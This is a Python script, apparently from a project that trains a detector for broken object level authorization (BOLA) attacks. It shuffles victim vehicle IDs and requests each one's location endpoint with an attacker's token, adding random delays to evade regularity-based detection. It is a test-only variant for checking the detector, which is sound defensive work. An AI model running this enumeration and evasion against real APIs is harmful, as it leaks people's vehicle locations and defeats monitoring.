# services/bola-detector/attacks/bola_vehicle_scan_variant_random_delay.py
"""Biến thể TEST-ONLY của bola_vehicle_scan.py — KHÔNG đưa vào tập train
(Bước 2.2). Khác cách viết so với script gốc dùng để train:
  - Quét vehicle_id theo THỨ TỰ NGẪU NHIÊN thay vì tuần tự.
  - Delay ngẫu nhiên giữa các lần gọi (không đều đặn như bản gốc dùng
    time.sleep(1) cố định) — né phát hiện dựa trên tính đều đặn của request.
Dùng ở Bước 4 để kiểm tra model có học được BẢN CHẤT hành vi vượt quyền hay
chỉ học đúng dấu vết của 1 script cụ thể (Geirhos et al. — shortcut learning).
"""
import json
import random
import time
import uuid

import requests

from bola_vehicle_scan import BASE, login


def run_attack(attacker_token: str, victim_vehicle_ids: list[str], out_meta_path: str):
    attack_run_id = str(uuid.uuid4())
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "X-Attack-Run-Id": attack_run_id,
    }
    shuffled = victim_vehicle_ids[:]
    random.shuffle(shuffled)

    start = time.time()
    leaked = []
    for vid in shuffled:
        resp = requests.get(f"{BASE}/identity/api/v2/vehicle/{vid}/location", headers=headers)
        leaked.append({"vehicle_id": vid, "status": resp.status_code})
        time.sleep(random.uniform(0.3, 6.0))  # delay ngẫu nhiên, không cố định
    end = time.time()

    with open(out_meta_path, "a") as f:
        f.write(
            json.dumps(
                {
                    "attack_run_id": attack_run_id,
                    "attack_class": "BOLA",
                    "start_ts": start,
                    "end_ts": end,
                    "is_test_only_variant": True,
                    "variant": "random_order_random_delay",
                }
            )
            + "\n"
        )
    return attack_run_id, leaked


if __name__ == "__main__":
    import sys

    attacker_token = login("attacker@test.local", "Attacker123@")
    victim_vehicle_ids = [line.strip() for line in sys.stdin if line.strip()]
    attack_run_id, leaked = run_attack(
        attacker_token, victim_vehicle_ids, "attacks/attack_runs_meta.jsonl"
    )
    print(f"[variant/random_delay] attack_run_id={attack_run_id}")
    for item in leaked:
        print(item)
